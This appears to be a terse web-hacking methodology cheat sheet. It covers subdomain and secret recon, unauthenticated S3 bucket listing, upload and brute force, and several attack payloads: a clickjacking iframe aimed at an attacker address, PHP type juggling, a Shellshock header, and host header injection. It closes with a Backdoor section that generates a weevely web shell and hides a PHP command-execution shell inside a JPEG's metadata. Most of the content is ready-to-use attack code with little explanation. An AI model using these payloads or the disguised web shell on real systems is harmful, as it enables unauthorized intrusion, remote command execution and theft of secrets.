# Methodology
![Methodology](https://scontent-eze1-1.xx.fbcdn.net/v/t1.6435-9/49640355_2448347995207650_2638728052967735296_n.jpg?_nc_cat=108&ccb=1-5&_nc_sid=730e14&_nc_ohc=JrPE4yh-SjEAX9ZNBzl&_nc_ht=scontent-eze1-1.xx&oh=00_AT_lRUrtv1QhYhpynxxHQhDU2-e2KVv7v7yhLUD54NgnZQ&oe=628F9681)
## Summary
- [Recon](#recon)
  - [Recon searching for](#recon-searching-for)
  - [S3 Buckets](#s3-buckets)
- [ClickJacking](#clickjacking)
- [Type Juggling](#type-juggling)
- [ShellShock Attack](#shellshock-attack)
- [CRLF](#crlf)
- [Google Dorks](#google-dorks)
- [Host Header Attack](#host-header-atttack)
- [Subdomain Takeover](#subdomain-takeover)
- [API Keys](#api-keys)
- [GraphQL](#graphql)
- [WAF Bypass](#waf-bypass)
# Recon
1) Enumerate Domains.
2) Enumerate Subdomains: recon.sh + httpx or Knockpy -w subdomains $domain.com.
3) Enumerate Params: gau, waybackurls, paramspider and dirsearch.
4) Enumerate ports of each subdomain: nmap.
5) API KEYS - cat url.txt | grep "\.js" xargs -I@ sh -c 'python.exe SecretFinder.py -i @ -e -o cli' | tee apiKeys.txt
6) Maltego + FOCA.
7) [Google Dorks](#google-dorks).
8) Frameworks, Languages, PaaS and Servers.
9) Shodan to know cves exposure

## Recon searching for:

### Requests:
1) setRequestHeader
2) XMLHttpRequest
3) $.ajax 
4) $.get 
5) $.post 
6) $.getJSON 
7) fetch( 
8) axios({ 
9) Url = "http

### FIREBASE:
firebaseio.com/.json

### Cookies:
1) set_cookie(
2) base64

## S3 Buckets
* s3.amazonaws.com
* Read: aws s3 ls s3://domain --no-sign-request = Response: An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
* Upload: aws s3 cp poc.html s3://domain --no-sign-request = load to s3://
* Bruteforce: cat subdomains.txt | xargs -I@ sh -c 'aws s3 ls s3://@ --no-sign-request' | grep -v 'An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist'

### API Tokens:
1) pk_live
2) sk_live
3) AIza

### JWT
The Json web tokens cannot be tested in automated ways, so it is more likely to meet some bugs.

### Open Redirect
> Use "Burp Seach"
```http
?redirection=
?redir=
?redireccion=
```

## Clickjacking
> List forms to change password, email and delete account via GET Request + Submit input.
```html
<iframe src="$url?email=hacker@attacker-website.com"></iframe>
```

## Type Juggling
```http
POST https://example.com/login.php HTTP/1.1
Accept: */*
Content-Type: application/json

usuario=admin&password[]=anything
```
Add [] to password

## Shellshock Attack
```http
POST https://example.com/session.cgi HTTP/1.1
Accept: */*
User-Agent: () { :; }; echo "pwned"
```
## CRLF
Always test params with GET Requests: https://github.com/AngelJuanMa/Web-Vulnerabilities/blob/main/Payloads/CRLF.txt

## Google Dorks
```bash
python3.9 pagodo.py -d example.com -g ./dorks/all_google_dorks.txt
cat pagodo.py.log | grep 'Found unique URL #'
```
4.2 days to finish

## Host Header Atttack
```http
POST https://example.com/reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: SUBDOMAIN.burpcollaborator.net
```

## Subdomain Takeover
https://github.com/EdOverflow/can-i-take-over-xyz

## Api keys
https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/keyhacks-api.md

## Graphql
InQL extension of burp suite to list endpoints. 

## WAF bypass
```bash
sudo apt install jq
git clone https://github.com/vincentcox/bypass-firewalls-by-DNS-history
cd bypass-firewalls-by-DNS-history/
bash bypass-firewalls-by-DNS-history.sh --help
```
## Backdoor
```bash
weevely generate 12345 404.php
weevely http://domain.com/404.php 12345

jhead -purejpg ns.jpg
jhead -ce ns.jpg
mv ns.jpg ns.php.jpg

Insert:

<style>body{font-size: 0;}h1{font-size: 12px}</style><h1>
<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="foto.jpg" border=0>
';}__halt_compiler();?></h1>

:wq
```

```http
http://domain.com/ns.php.jpg?cmd=ls
```
